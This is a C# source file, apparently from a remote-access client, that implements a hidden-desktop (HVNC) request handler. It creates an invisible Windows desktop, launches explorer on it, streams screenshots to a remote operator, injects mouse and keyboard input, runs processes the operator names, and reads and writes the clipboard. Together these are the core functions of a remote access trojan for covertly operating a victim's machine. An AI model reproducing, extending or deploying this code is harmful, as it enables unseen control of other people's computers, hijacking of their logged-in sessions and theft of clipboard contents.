using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using RemoteControl.Client.Utils;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;

namespace RemoteControl.Client.Handlers
{
    /// <summary>
    /// HVNC 隐形桌面请求处理器
    /// </summary>
    class RequestHVNCHandler : IRequestHandler
    {
        private HVNCDesktop _desktop;
        private volatile bool _isRunning = false;
        private Thread _captureThread;
        private int _fps = 5;
        private int _adaptiveFps = 5;
        private int _jpegQuality = 70;
        private const int MinFps = 1;
        private const int MinJpegQuality = 35;
        private const int MaxJpegQuality = 75;

        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            switch (reqType)
            {
                case ePacketType.PACKET_HVNC_START_REQUEST:
                    HandleStart(session, reqObj);
                    break;
                case ePacketType.PACKET_HVNC_STOP_REQUEST:
                    HandleStop();
                    break;
                case ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST:
                    HandleMouseEvent(reqObj);
                    break;
                case ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST:
                    HandleKeyboardEvent(reqObj);
                    break;
                case ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST:
                    HandleRunProcess(reqObj);
                    break;
                case ePacketType.PACKET_HVNC_CLIPBOARD_GET_REQUEST:
                    HandleClipboardGet(session);
                    break;
                case ePacketType.PACKET_HVNC_CLIPBOARD_SET_REQUEST:
                    HandleClipboardSet(reqObj);
                    break;
            }
        }

        private void HandleStart(SocketSession session, object reqObj)
        {
            var resp = new ResponseHVNCStart();
            try
            {
                if (_isRunning)
                {
                    HandleStop();
                    Thread.Sleep(500);
                }

                var req = reqObj as RequestHVNCStart;
                if (req != null && req.Fps > 0)
                    _fps = req.Fps;

                string deskName = "HVNC_" + Guid.NewGuid().ToString("N").Substring(0, 8);
                _desktop = new HVNCDesktop();
                if (!_desktop.Create(deskName))
                {
                    resp.Result = false;
                    resp.Message = "CreateDesktop failed";
                    session.Send(ePacketType.PACKET_HVNC_START_RESPONSE, resp);
                    return;
                }

                // 参考qwqdanchun/HVNC: 正确启动explorer并配置任务栏
                _desktop.StartExplorerWithTaskbar();
                Thread.Sleep(1000);

                _isRunning = true;
                resp.Result = true;
                resp.DesktopName = deskName;
                int screenW, screenH;
                _desktop.GetScreenResolution(out screenW, out screenH);
                resp.ScreenWidth = screenW;
                resp.ScreenHeight = screenH;
                session.Send(ePacketType.PACKET_HVNC_START_RESPONSE, resp);

                // 启动截图循环
                _captureThread = new Thread(() => CaptureLoop(session))
                {
                    IsBackground = true,
                    Name = "HVNC_Capture"
                };
                _captureThread.Start();
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
                session.Send(ePacketType.PACKET_HVNC_START_RESPONSE, resp);
            }
        }

        private void HandleStop()
        {
            _isRunning = false;
            if (_captureThread != null)
            {
                _captureThread.Join(3000);
                _captureThread = null;
            }
            if (_desktop != null)
            {
                _desktop.Dispose();
                _desktop = null;
            }
        }

        private void HandleMouseEvent(object reqObj)
        {
            if (_desktop == null) return;
            try
            {
                var req = reqObj as RequestMouseEvent;
                if (req == null) return;

                int button = 1; // left
                if (req.MouseButton == eMouseButtons.Right) button = 2;

                if (req.MouseOperation == eMouseOperations.MouseScroll)
                {
                    _desktop.InjectScrollEvent(req.MouseLocation.X, req.MouseLocation.Y, req.ScrollDelta);
                    return;
                }

                int ope = 2; // move
                switch (req.MouseOperation)
                {
                    case eMouseOperations.MouseDown: ope = 0; break;
                    case eMouseOperations.MouseUp: ope = 1; break;
                    case eMouseOperations.MouseMove: ope = 2; break;
                    case eMouseOperations.MouseDoubleClick: ope = 3; break;
                }

                _desktop.InjectMouseEvent(req.MouseLocation.X, req.MouseLocation.Y, button, ope);
            }
            catch { }
        }

        private void HandleKeyboardEvent(object reqObj)
        {
            if (_desktop == null) return;
            try
            {
                var req = reqObj as RequestKeyboardEvent;
                if (req == null) return;
                _desktop.InjectKeyboardEvent(req.KeyValue, req.KeyOperation == eKeyboardOpe.KeyDown);
            }
            catch { }
        }

        private void HandleRunProcess(object reqObj)
        {
            if (_desktop == null) return;
            try
            {
                var req = reqObj as RequestHVNCRunProcess;
                if (req == null) return;
                _desktop.StartProcess(req.FilePath, req.Arguments ?? "");
            }
            catch { }
        }

        private void CaptureLoop(SocketSession session)
        {
            while (_isRunning)
            {
                Stopwatch frameWatch = Stopwatch.StartNew();
                int requestedFps = Math.Max(MinFps, _fps);
                if (_adaptiveFps < MinFps || _adaptiveFps > requestedFps)
                    _adaptiveFps = requestedFps;
                int interval = 1000 / _adaptiveFps;

                try
                {
                    using (Bitmap bmp = _desktop.CaptureScreen())
                    {
                        if (bmp != null)
                        {
                            var resp = new ResponseHVNCScreen();
                            resp.SetImageJpegQuality(bmp, _jpegQuality);
                            resp.Width = bmp.Width;
                            resp.Height = bmp.Height;
                            Stopwatch sendWatch = Stopwatch.StartNew();
                            session.Send(ePacketType.PACKET_HVNC_SCREEN_RESPONSE, resp);
                            sendWatch.Stop();
                            AdjustRealtimeBudget(sendWatch.ElapsedMilliseconds, requestedFps);
                        }
                    }
                }
                catch { }

                int remain = interval - (int)frameWatch.ElapsedMilliseconds;
                if (remain > 0)
                    Thread.Sleep(remain);
                else
                    Thread.Sleep(1);
            }
        }

        private void AdjustRealtimeBudget(long sendMilliseconds, int requestedFps)
        {
            int frameBudget = 1000 / Math.Max(MinFps, _adaptiveFps);
            if (sendMilliseconds > 250 || sendMilliseconds > frameBudget)
            {
                if (_adaptiveFps > MinFps)
                    _adaptiveFps--;
                if (_jpegQuality > MinJpegQuality)
                    _jpegQuality -= 5;
            }
            else if (sendMilliseconds < 50)
            {
                if (_adaptiveFps < requestedFps)
                    _adaptiveFps++;
                if (_jpegQuality < MaxJpegQuality)
                    _jpegQuality += 2;
            }
        }

        private void HandleClipboardGet(SocketSession session)
        {
            if (_desktop == null) return;
            try
            {
                string text = _desktop.GetClipboardText() ?? "";
                var resp = new ResponseClipboardGet();
                resp.Result = true;
                resp.Text = text;
                session.Send(ePacketType.PACKET_HVNC_CLIPBOARD_GET_RESPONSE, resp);
            }
            catch { }
        }

        private void HandleClipboardSet(object reqObj)
        {
            if (_desktop == null) return;
            try
            {
                var req = reqObj as RequestClipboardSet;
                if (req == null) return;
                _desktop.SetClipboardText(req.Text ?? "");
            }
            catch { }
        }
    }
}
